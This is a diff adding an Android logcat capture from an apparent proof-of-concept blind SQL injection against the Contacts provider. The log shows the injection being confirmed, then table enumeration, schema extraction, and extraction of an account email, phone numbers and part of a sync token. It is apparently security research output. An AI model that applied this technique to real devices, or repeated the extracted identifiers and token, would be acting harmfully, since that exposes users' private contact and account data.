@@ -1,0 +1,43 @@
+--------- beginning of main
+09-07 02:34:31.074 24638 24668 D ContactsBlindSQLi: Baseline: 3 contacts
+09-07 02:34:31.074 24638 24668 D ContactsBlindSQLi: === Test 1: Confirm subquery execution ===
+09-07 02:34:31.081 24638 24668 D ContactsBlindSQLi: (tables > 0): 3 rows | (tables > 999): 0 rows
+09-07 02:34:31.081 24638 24668 D ContactsBlindSQLi: [CONFIRMED] Boolean-based blind SQLi works
+09-07 02:34:31.081 24638 24668 D ContactsBlindSQLi: === Test 2: Extract table count ===
+09-07 02:34:31.141 24638 24668 D ContactsBlindSQLi: Table count: 35
+09-07 02:34:31.141 24638 24668 D ContactsBlindSQLi: === Test 3: Extract table names ===
+09-07 02:34:31.452 24638 24668 D ContactsBlindSQLi: Table[0]: android_metadata
+09-07 02:34:31.632 24638 24668 D ContactsBlindSQLi: Table[1]: _sync_state
+09-07 02:34:31.923 24638 24668 D ContactsBlindSQLi: Table[2]: _sync_state_metadata
+09-07 02:34:32.056 24638 24668 D ContactsBlindSQLi: Table[3]: properties
+09-07 02:34:32.169 24638 24668 D ContactsBlindSQLi: Table[4]: accounts
+09-07 02:34:32.396 24638 24668 D ContactsBlindSQLi: Table[5]: sqlite_sequence
+09-07 02:34:32.511 24638 24668 D ContactsBlindSQLi: Table[6]: contacts
+09-07 02:34:32.768 24638 24668 D ContactsBlindSQLi: Table[7]: deleted_contacts
+09-07 02:34:33.117 24638 24668 D ContactsBlindSQLi: Table[8]: raw_contacts
+09-07 02:34:33.478 24638 24668 D ContactsBlindSQLi: Table[9]: stream_items
+09-07 02:34:33.478 24638 24668 D ContactsBlindSQLi: === Test 4: Cross-table data extraction ===
+09-07 02:34:33.478 24638 24668 D ContactsBlindSQLi: --- Accounts table ---
+09-07 02:34:33.501 24638 24668 D ContactsBlindSQLi: Account count: 1
+09-07 02:34:33.937 24638 24668 D ContactsBlindSQLi: Account[0]: sandiyotest@gmail.com (com.google)
+09-07 02:34:33.937 24638 24668 D ContactsBlindSQLi: --- Phone numbers from internal data table ---
+09-07 02:34:33.962 24638 24668 D ContactsBlindSQLi: Phone entries: 2
+09-07 02:34:34.131 24638 24668 D ContactsBlindSQLi: Phone[0]: 63854 36230
+09-07 02:34:34.303 24638 24668 D ContactsBlindSQLi: Phone[1]: 89860 87809
+09-07 02:34:34.303 24638 24668 D ContactsBlindSQLi: --- Emails from internal data table ---
+09-07 02:34:34.341 24638 24668 D ContactsBlindSQLi: Email entries: 0
+09-07 02:34:34.341 24638 24668 D ContactsBlindSQLi: --- Sync state ---
+09-07 02:34:34.362 24638 24668 D ContactsBlindSQLi: Sync state entries: 1
+09-07 02:34:34.781 24638 24668 D ContactsBlindSQLi: SyncState[0]: sandiyotest@gmail.com
+09-07 02:34:34.781 24638 24668 D ContactsBlindSQLi: --- Sync state raw token ---
+09-07 02:34:34.819 24638 24668 D ContactsBlindSQLi: SyncState data length: 125 bytes
+09-07 02:34:35.960 24638 24668 D ContactsBlindSQLi: SyncState token (first 40 chars): 
+09-07 02:34:35.960 24638 24668 D ContactsBlindSQLi: \MisA2Rc-NAAAABII0_HH5NXVlgMQ0_HH5NXVlg
+09-07 02:34:35.960 24638 24668 D ContactsBlindSQLi: === Test 5: Deleted contacts data ===
+09-07 02:34:36.002 24638 24668 D ContactsBlindSQLi: Deleted raw_contacts: 0
+09-07 02:34:36.034 24638 24668 D ContactsBlindSQLi: Dirty raw_contacts: 0
+09-07 02:34:36.034 24638 24668 D ContactsBlindSQLi: === Test 6: Schema extraction (first 3 tables) ===
+09-07 02:34:36.735 24638 24668 D ContactsBlindSQLi: Schema[0]: CREATE TABLE android_metadata (locale TEXT)
+09-07 02:34:39.535 24638 24668 D ContactsBlindSQLi: Schema[1]: CREATE TABLE _sync_state (_id INTEGER PRIMARY KEY,account_name TEXT NOT NULL,account_type TEXT NOT NULL,data TEXT,UNIQUE(account_name, account_type))
+09-07 02:34:40.453 24638 24668 D ContactsBlindSQLi: Schema[2]: CREATE TABLE _sync_state_metadata (version INTEGER)
+09-07 02:34:40.453 24638 24668 D ContactsBlindSQLi: === ALL TESTS COMPLETE ===
